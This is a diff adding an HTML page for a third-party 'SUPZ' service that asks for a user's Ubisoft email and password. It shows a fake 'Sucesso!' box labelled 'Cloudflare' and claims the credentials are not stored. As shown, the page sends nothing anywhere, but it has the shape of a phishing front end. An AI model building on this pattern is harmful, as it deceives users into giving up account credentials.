@@ -1,0 +1,40 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Ubisoft - SUPZ</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 flex items-center justify-center min-h-screen">
+  <div class="bg-gray-800 p-6 rounded-2xl shadow-lg w-full max-w-md">
+    <div class="flex flex-col items-center mb-4">
+      <img src="logo-supz.png" alt="SUPZ Logo" class="w-28 h-28 rounded-full mb-4 shadow-md border border-gray-600 object-cover">
+
+      <h2 class="text-white text-xl font-bold">Add Your Account</h2>
+    </div>
+
+    <input type="email" placeholder="Enter your Ubisoft email" class="w-full mb-3 p-3 rounded bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
+    <input type="password" placeholder="Enter your Ubisoft password" class="w-full mb-3 p-3 rounded bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
+
+    <div id="successBox" class="flex items-center justify-between bg-green-600 text-white px-3 py-2 rounded mb-3 hidden">
+      <span>✅ Sucesso!</span>
+      <span class="text-xs">Cloudflare</span>
+    </div>
+
+    <button onclick="showSuccess()" class="w-full bg-indigo-500 hover:bg-indigo-600 text-white p-3 rounded font-semibold transition">
+      Add Account
+    </button>
+
+    <p class="text-xs text-gray-400 text-center mt-4">
+      Your credentials are only used to authenticate with Ubisoft and are not stored.
+    </p>
+  </div>
+
+  <script>
+    function showSuccess() {
+      document.getElementById('successBox').classList.remove('hidden');
+    }
+  </script>
+</body>
+</html>
